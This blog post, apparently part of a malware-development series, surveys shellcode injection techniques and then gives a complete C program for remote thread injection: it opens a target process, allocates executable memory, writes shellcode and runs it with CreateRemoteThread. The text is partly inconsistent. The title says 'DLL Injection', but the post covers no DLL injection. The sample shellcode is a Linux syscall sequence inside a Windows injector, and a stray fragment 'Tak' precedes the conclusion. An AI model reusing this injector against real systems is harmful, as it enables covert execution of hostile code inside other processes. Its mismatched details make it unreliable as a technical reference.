---
layout: single
title: "Payload Unleashed: DLL Injection"
date: 2024-03-01
classes: wide
header:
  teaser: /assets/images/maldev.png
categories:
  - infosec
tags:
  - windows
  - malware
  - payload-unleashed
---
Shellcode is a snippet of machine code typically written in assembly language. It's designed to perform a specific task when executed, often granting the attacker control over the compromised system. 

Shellcode injection involves the insertion and execution of such malicious code within the memory space of a target process, bypassing traditional security measures.

# Techniques for Shellcode Injection

## 1. Process Injection:

   - **Remote Thread Injection**: This technique involves creating a remote thread in the target process and directing it to execute the shellcode.
   - **Process Hollowing**: In process hollowing, a legitimate process is spawned in a suspended state, its memory contents replaced with the attacker's shellcode, and then resumed to execute the malicious code.

## 2. Code Cave Injection:

   - **Code Cave**: A code cave refers to an unused or padding section of executable memory within a process. Attackers exploit these code caves to inject and execute their shellcode, often evading detection.
   - **Return-Oriented Programming (ROP)**: ROP chains leverage existing code fragments within a process, known as gadgets, to perform malicious operations. Attackers construct a sequence of gadgets that ultimately lead to the execution of the injected shellcode.

To be concrete and concise, in this blog post we will only cover **Remote Thread Injection**. 

# Hands-On: Shellcode Injection with C Code Snippet 
## Understanding Shellcode Injection Process

Before delving into the code snippet, let's understand the purpose of each function used in the shellcode injection process and its significance within the attack:

1.   **Opening the Target Process**: Use [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to open a handle to the target process identified by its process ID.
    
2.   **Memory Allocation**: Use [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) to allocate memory within the address space of the target process.
    
3.   **Shellcode Injection**: Use [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) to write the shellcode to the allocated memory within the target process.
    
4.   **Remote Thread Creation**: Use [`CreateRemoteThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) to create a remote thread in the target process, specifying the entry point as the allocated memory containing the shellcode.
    
5.   **Cleanup**: Close handles and release allocated memory after the execution of the remote thread.


```C
#include <windows.h>
#include <stdio.h>

// Shellcode payload
unsigned char shellcode[] = "\x48\x31\xc0\x48\x83\xc0\x0b\x48\x89\xc2\x48\x31\xff\x0f\x05";

int main()
{
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <TARGET_PROCESS_ID>); // Replace <TARGET_PROCESS_ID> with the process ID of the target process
    if (hProcess == NULL) {
        printf("Failed to open target process. Error code: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory within the target process
    LPVOID pAllocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAllocatedMemory == NULL) {
        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory in the target process
    if (!WriteProcessMemory(hProcess, pAllocatedMemory, shellcode, sizeof(shellcode), NULL)) {
        printf("Failed to write shellcode to target process. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread. Error code: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to terminate
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}

```


Tak
# Conclusion

Shellcode injection represents a formidable challenge in the realm of cybersecurity, enabling attackers to covertly execute malicious code within legitimate processes. Understanding the intricacies of shellcode injection, along with implementing robust detection and mitigation strategies, is essential for organizations to defend against this stealthy threat. By staying vigilant and adopting a multi-layered security approach, organizations can bolster their defenses and mitigate the risks posed by shellcode injection in today's dynamic threat landscape. Explore more insights into cybersecurity challenges and solutions in our ongoing series.